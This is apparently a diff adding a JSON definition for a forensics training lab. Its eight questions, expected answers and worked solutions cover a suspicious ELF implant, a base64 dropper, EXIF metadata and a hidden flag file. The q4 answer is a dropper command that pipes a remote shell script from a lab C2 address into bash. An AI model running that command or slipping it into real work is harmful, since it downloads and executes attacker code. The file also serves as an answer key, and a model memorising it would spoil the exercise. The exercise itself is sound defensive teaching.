@@ -1,0 +1,57 @@
+{
+  "id": "01-artifacts",
+  "title": "Suspicious file analysis",
+  "shortTitle": "01 — Suspicious file analysis",
+  "workdir": "/home/isopod/labs/forensics/01-artifacts/",
+  "intro": "Three files have arrived from an endpoint triage: `payload.bin` (unknown binary), `dropper.b64` (encoded blob), and `photo.jpg` (image attachment recovered from the attacker's staging area). Work through each file to determine what it is, what it contains, and what the attacker was doing.",
+  "questions": [
+    {
+      "id": "q1",
+      "prompt": "A quick first step in file analysis is to inspect the raw header bytes — they reveal the true file type regardless of extension.\n\nWhat are the first 4 bytes of `payload.bin` in hexadecimal?",
+      "expectedOutput": "7f454c46",
+      "solutionMarkdown": "```bash\nhead -c 4 payload.bin | xxd -p\n# 7f454c46\n```\n\nThe bytes `7f 45 4c 46` are the **ELF magic number** — the standard header for Linux executable files (`\\x7f` + the ASCII letters `E`, `L`, `F`). Seeing this tells you the file was built for Linux and is likely a binary executable or shared object, regardless of what the `.bin` extension suggests.\n\nThe `file` command uses this same magic-byte lookup internally:\n```bash\nfile payload.bin\n```"
+    },
+    {
+      "id": "q2",
+      "prompt": "Extract printable strings of length ≥ 10 characters from `payload.bin`. How many do you find?",
+      "expectedOutput": "3",
+      "solutionMarkdown": "```bash\nstrings -n 10 payload.bin\n# # beacon interval: 60\n# http://10.78.8.250/c2/update\n# User-Agent: Mozilla/5.0\n\nstrings -n 10 payload.bin | wc -l\n# 3\n```\n\n`strings` scans binary files for sequences of printable characters. The `-n 10` flag raises the minimum length from the default 4 to 10, filtering out short coincidental matches. Three meaningful strings emerge — all characteristic of a beacon-style implant:\n\n- A **beacon interval** comment\n- A **C2 callback URL**\n- A spoofed **User-Agent header**"
+    },
+    {
+      "id": "q3",
+      "prompt": "One of the embedded strings is a URL pointing to the attacker's command-and-control server. What is it?",
+      "expectedOutput": "http://10.78.8.250/c2/update",
+      "solutionMarkdown": "```bash\nstrings -n 10 payload.bin | grep http\n# http://10.78.8.250/c2/update\n```\n\nThis is the **C2 callback URL** — the address the implant reaches out to for instructions or to deliver data. `10.78.8.250` is inside the lab network but does not correspond to any running host, which is consistent with a C2 that has since gone offline or was never stood up.\n\nIn a real investigation you would:\n- Check firewall logs for outbound connections to this IP\n- Query threat-intel feeds for the IP's reputation\n- Correlate the path `/c2/update` with web proxy logs"
+    },
+    {
+      "id": "q4",
+      "prompt": "`dropper.b64` contains a base64-encoded payload. Decode it. The second line of the decoded output is the command the dropper executes. What is it?",
+      "expectedOutput": "curl -s http://10.78.8.250/shell.sh | bash",
+      "solutionMarkdown": "```bash\nbase64 -d dropper.b64\n# #!/bin/bash\n# curl -s http://10.78.8.250/shell.sh | bash\n\nbase64 -d dropper.b64 | sed -n '2p'\n# curl -s http://10.78.8.250/shell.sh | bash\n```\n\nThis is a classic **in-memory dropper**: download a shell script from the C2 and pipe it directly into `bash`, never touching the disk as a named file. The same C2 IP appears in `payload.bin`, confirming these two artifacts are part of the same campaign.\n\n`-s` (silent) suppresses curl's progress output so the execution stays quiet. This pattern is extremely common in commodity malware and phishing post-exploitation."
+    },
+    {
+      "id": "q5",
+      "prompt": "The `photo.jpg` attachment came from the attacker's staging server. Examine its EXIF metadata. What name is recorded in the `Artist` field?",
+      "expectedOutput": "ops-team",
+      "solutionMarkdown": "```bash\nexiftool -Artist photo.jpg\n# Artist                          : ops-team\n```\n\n`exiftool` parses the EXIF/IPTC/XMP metadata embedded in image files. EXIF data is written by cameras, editing software, and — in this case — automated tooling used by the attacker to tag operational assets.\n\nThe value `ops-team` suggests the attacker is part of a group and used a shared toolchain that stamps images with this team label. This kind of metadata is often overlooked but can link separate incidents to the same threat actor."
+    },
+    {
+      "id": "q6",
+      "prompt": "The `Comment` metadata field in `photo.jpg` records additional context about when and how it was captured. What is the full value of that field?",
+      "expectedOutput": "captured: 2024-03-15 02:31:07",
+      "solutionMarkdown": "```bash\nexiftool -Comment photo.jpg\n# Comment                         : captured: 2024-03-15 02:31:07\n```\n\nThe timestamp `2024-03-15 02:31:07` is a strong forensic artifact: it pinpoints the moment this file was staged. Cross-referencing this timestamp with server access logs, auth logs, or SIEM events can help anchor the full attack timeline.\n\nTo see all metadata at once:\n```bash\nexiftool photo.jpg\n```"
+    },
+    {
+      "id": "q7",
+      "prompt": "The `report.tar.gz` archive was recovered alongside the other files. List its contents to get a full inventory — don't extract yet. How many files does the archive contain?",
+      "expectedOutput": "3",
+      "solutionMarkdown": "```bash\ntar tf report.tar.gz\n# report/summary.txt\n# report/notes.log\n# report/.c2.key\n\ntar tf report.tar.gz | wc -l\n# 3\n```\n\n`tar tf` lists archive contents without extracting. The directory entry `report/` is not counted since `tar tf` lists only files here (note: some versions may include directory entries — verify with `grep -v '/$'` if needed).\n\nNotice the hidden file `.c2.key` — files starting with `.` are hidden from casual `ls` but included in archive listings. Always use `tar tf` before extracting to check what an unknown archive contains."
+    },
+    {
+      "id": "q8",
+      "prompt": "Extract the archive. Inside the `report/` directory there is a hidden file. Read it. What does it contain?",
+      "expectedOutput": "FLAG=hermit-anchor-0x01",
+      "solutionMarkdown": "```bash\ntar xf report.tar.gz\ncat report/.c2.key\n# FLAG=hermit-anchor-0x01\n```\n\nThe attacker embedded a marker in this file — likely to verify successful staging or as a beacon acknowledgement token. In CTF-style forensics this is the flag; in a real incident, similar embedded strings can be:\n\n- **Campaign tags** used to attribute activity to a specific operation\n- **Decryption keys** for other staged payloads\n- **Authentication tokens** for the next stage of the attack\n\nAlways list archive contents before extracting to avoid path traversal surprises (`tar tf` first, then `tar xf`)."
+    }
+  ]
+}
